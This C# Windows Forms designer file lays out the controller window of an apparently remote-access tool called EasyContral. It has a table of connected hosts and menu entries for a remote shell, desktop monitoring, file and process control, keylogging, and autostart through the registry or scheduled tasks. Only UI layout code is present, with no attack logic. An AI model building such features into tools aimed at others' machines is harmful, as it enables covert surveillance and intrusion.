namespace EasyContral_Server
{
    partial class Form1
    {
        /// <summary>
        /// 必需的设计器变量。
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// 清理所有正在使用的资源。
        /// </summary>
        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows 窗体设计器生成的代码

        /// <summary>
        /// 设计器支持所需的方法 - 不要修改
        /// 使用代码编辑器修改此方法的内容。
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.listView1 = new System.Windows.Forms.ListView();
            this.ID = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Head_IP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Head_HostName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Head_CPU = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Head_Memory = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Head_OSInfo = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Head_SleepTime = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.GetShell = new System.Windows.Forms.ToolStripMenuItem();
            this.FileContral = new System.Windows.Forms.ToolStripMenuItem();
            this.DesktopContral = new System.Windows.Forms.ToolStripMenuItem();
            this.ProcessContral = new System.Windows.Forms.ToolStripMenuItem();
            this.AutoRunContral = new System.Windows.Forms.ToolStripMenuItem();
            this.Registry = new System.Windows.Forms.ToolStripMenuItem();
            this.TaskScheduler = new System.Windows.Forms.ToolStripMenuItem();
            this.Edit = new System.Windows.Forms.ToolStripMenuItem();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.KeyBoardListend = new System.Windows.Forms.ToolStripMenuItem();
            this.On = new System.Windows.Forms.ToolStripMenuItem();
            this.Off = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // listView1
            // 
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.ID,
            this.Head_IP,
            this.Head_HostName,
            this.Head_CPU,
            this.Head_Memory,
            this.Head_OSInfo,
            this.Head_SleepTime});
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(6, 10);
            this.listView1.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(676, 202);
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.MouseClick += new System.Windows.Forms.MouseEventHandler(this.listView1_MouseClick);
            // 
            // ID
            // 
            this.ID.Text = "ID";
            this.ID.Width = 40;
            // 
            // Head_IP
            // 
            this.Head_IP.Text = "IP";
            this.Head_IP.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.Head_IP.Width = 110;
            // 
            // Head_HostName
            // 
            this.Head_HostName.Text = "计算机名";
            this.Head_HostName.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.Head_HostName.Width = 140;
            // 
            // Head_CPU
            // 
            this.Head_CPU.Text = "CPU";
            this.Head_CPU.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.Head_CPU.Width = 120;
            // 
            // Head_Memory
            // 
            this.Head_Memory.Text = "内存";
            this.Head_Memory.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // Head_OSInfo
            // 
            this.Head_OSInfo.Text = "系统";
            this.Head_OSInfo.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.Head_OSInfo.Width = 140;
            // 
            // Head_SleepTime
            // 
            this.Head_SleepTime.Text = "响应时间";
            this.Head_SleepTime.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(32, 32);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.GetShell,
            this.FileContral,
            this.DesktopContral,
            this.ProcessContral,
            this.KeyBoardListend,
            this.AutoRunContral,
            this.Edit});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(181, 180);
            // 
            // GetShell
            // 
            this.GetShell.Name = "GetShell";
            this.GetShell.Size = new System.Drawing.Size(180, 22);
            this.GetShell.Text = "Shell";
            this.GetShell.Click += new System.EventHandler(this.GetShell_Click);
            // 
            // FileContral
            // 
            this.FileContral.Name = "FileContral";
            this.FileContral.Size = new System.Drawing.Size(180, 22);
            this.FileContral.Text = "文件管理";
            this.FileContral.Click += new System.EventHandler(this.FileContral_Click);
            // 
            // DesktopContral
            // 
            this.DesktopContral.Name = "DesktopContral";
            this.DesktopContral.Size = new System.Drawing.Size(180, 22);
            this.DesktopContral.Text = "桌面监控";
            this.DesktopContral.Click += new System.EventHandler(this.DesktopContral_Click);
            // 
            // ProcessContral
            // 
            this.ProcessContral.Name = "ProcessContral";
            this.ProcessContral.Size = new System.Drawing.Size(180, 22);
            this.ProcessContral.Text = "进程管理";
            this.ProcessContral.Click += new System.EventHandler(this.ProcessContral_Click);
            // 
            // AutoRunContral
            // 
            this.AutoRunContral.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.Registry,
            this.TaskScheduler});
            this.AutoRunContral.Name = "AutoRunContral";
            this.AutoRunContral.Size = new System.Drawing.Size(180, 22);
            this.AutoRunContral.Text = "自启动";
            // 
            // Registry
            // 
            this.Registry.Name = "Registry";
            this.Registry.Size = new System.Drawing.Size(148, 22);
            this.Registry.Text = "通过注册表";
            this.Registry.Click += new System.EventHandler(this.Registry_Click);
            // 
            // TaskScheduler
            // 
            this.TaskScheduler.Name = "TaskScheduler";
            this.TaskScheduler.Size = new System.Drawing.Size(148, 22);
            this.TaskScheduler.Text = "通过计划任务";
            this.TaskScheduler.Click += new System.EventHandler(this.TaskScheduler_Click);
            // 
            // Edit
            // 
            this.Edit.Name = "Edit";
            this.Edit.Size = new System.Drawing.Size(180, 22);
            this.Edit.Text = "设置响应时间";
            this.Edit.Click += new System.EventHandler(this.Edit_Click);
            // 
            // richTextBox1
            // 
            this.richTextBox1.BackColor = System.Drawing.SystemColors.MenuText;
            this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.125F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.richTextBox1.ForeColor = System.Drawing.Color.Lime;
            this.richTextBox1.Location = new System.Drawing.Point(6, 222);
            this.richTextBox1.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(676, 182);
            this.richTextBox1.TabIndex = 1;
            this.richTextBox1.Text = "";
            this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
            // 
            // KeyBoardListend
            // 
            this.KeyBoardListend.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.On,
            this.Off});
            this.KeyBoardListend.Name = "KeyBoardListend";
            this.KeyBoardListend.Size = new System.Drawing.Size(180, 22);
            this.KeyBoardListend.Text = "键盘监听";
            // 
            // On
            // 
            this.On.Name = "On";
            this.On.Size = new System.Drawing.Size(180, 22);
            this.On.Text = "开";
            this.On.Click += new System.EventHandler(this.On_Click);
            // 
            // Off
            // 
            this.Off.Name = "Off";
            this.Off.Size = new System.Drawing.Size(180, 22);
            this.Off.Text = "关";
            this.Off.Click += new System.EventHandler(this.Off_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(686, 407);
            this.Controls.Add(this.richTextBox1);
            this.Controls.Add(this.listView1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "EasyContral";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.ListView listView1;
        private System.Windows.Forms.ColumnHeader ID;
        private System.Windows.Forms.ColumnHeader Head_IP;
        private System.Windows.Forms.ColumnHeader Head_HostName;
        private System.Windows.Forms.ColumnHeader Head_CPU;
        private System.Windows.Forms.ColumnHeader Head_Memory;
        private System.Windows.Forms.ColumnHeader Head_OSInfo;
        private System.Windows.Forms.ColumnHeader Head_SleepTime;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
        private System.Windows.Forms.ToolStripMenuItem GetShell;
        private System.Windows.Forms.ToolStripMenuItem FileContral;
        private System.Windows.Forms.ToolStripMenuItem DesktopContral;
        private System.Windows.Forms.RichTextBox richTextBox1;
        private System.Windows.Forms.ToolStripMenuItem ProcessContral;
        private System.Windows.Forms.ToolStripMenuItem Edit;
        private System.Windows.Forms.ToolStripMenuItem AutoRunContral;
        private System.Windows.Forms.ToolStripMenuItem Registry;
        private System.Windows.Forms.ToolStripMenuItem TaskScheduler;
        private System.Windows.Forms.ToolStripMenuItem KeyBoardListend;
        private System.Windows.Forms.ToolStripMenuItem On;
        private System.Windows.Forms.ToolStripMenuItem Off;
    }
}

